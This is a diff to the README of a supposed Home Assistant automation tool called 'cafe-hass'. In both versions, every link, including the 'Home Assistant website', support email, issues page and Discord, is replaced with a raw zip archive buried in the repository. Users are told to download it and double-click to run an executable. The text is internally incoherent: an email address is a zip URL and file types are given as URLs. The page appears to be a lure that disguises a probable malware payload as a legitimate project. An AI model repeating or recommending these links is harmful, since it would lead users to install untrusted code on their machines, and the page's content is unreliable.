@@ -1,7 +1,7 @@
 # ☕ cafe-hass - Easy Automations for Home Assistant
 
 ## 📥 Download Now
-[![Download Version](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip%20Latest%https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip)](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip)
+[![Download Version](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip%20Latest%https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip)](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip)
 
 ## 📖 Overview
 Welcome to cafe-hass, your simple solution for home automation using Home Assistant. This tool helps you create smart automations without any complex setup. Whether you're managing lights, sensors, or any Home Assistant components, cafe-hass makes it easier.
@@ -9,20 +9,20 @@ Welcome to cafe-hass, your simple solution for home automation using Home Assist
 ## 🚀 Getting Started
 Follow these steps to get started with cafe-hass:
 
-1. Ensure you have Home Assistant installed on your device. If you haven't done this yet, visit the [Home Assistant website](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip) for instructions.
+1. Ensure you have Home Assistant installed on your device. If you haven't done this yet, visit the [Home Assistant website](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip) for instructions.
 
 2. Click on the download link below to go to our releases page and get the latest version of cafe-hass:
-   [Download the latest release](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip).
+   [Download the latest release](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip).
 
 ## 🔄 Download & Install
 To install cafe-hass, follow these steps:
 
 1. **Visit the Releases Page**: Go to the following link:
-   [https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip).
+   [https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip).
 
 2. **Download the Latest Version**: On the releases page, you will see a list of versions. Look for the most recent one, labeled as "Latest Release".
 
-3. **Choose Your File**: Depending on your operating system, select the appropriate file. For Windows, look for a .exe file. For Mac, find a .dmg file. Linux users often have https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip files.
+3. **Choose Your File**: Depending on your operating system, select the appropriate file. For Windows, look for a .exe file. For Mac, find a .dmg file. Linux users often have https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip files.
 
 4. **Run the File**: Once the download is complete, locate the file on your computer and double-click to run it. Follow the prompts provided by the installation wizard.
 
@@ -53,13 +53,13 @@ If you encounter issues while installing or using cafe-hass, consider the follow
 ## 📞 Support
 For additional help, you can contact our support team:
 
-- **Email**: https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip
-- **GitHub Issues**: Submit any issues or suggestions directly on our [GitHub Issues page](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip).
+- **Email**: https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip
+- **GitHub Issues**: Submit any issues or suggestions directly on our [GitHub Issues page](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip).
 
 ## 🌍 Community
 Join our community and connect with other users:
 
-- **Discord**: Join our [Discord server](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/.yarn/releases/hass_cafe_v2.4.zip) to chat with fellow users and developers.
+- **Discord**: Join our [Discord server](https://github.com/LucianoHMG/cafe-hass/raw/refs/heads/main/custom_components/cafe/cafe-hass-1.0.zip) to chat with fellow users and developers.
 - **Forums**: Visit our community forums to share ideas, solutions, and tips.
 
 Thank you for choosing cafe-hass, your easy way to automate your home. Enjoy making your life smarter with Home Assistant!
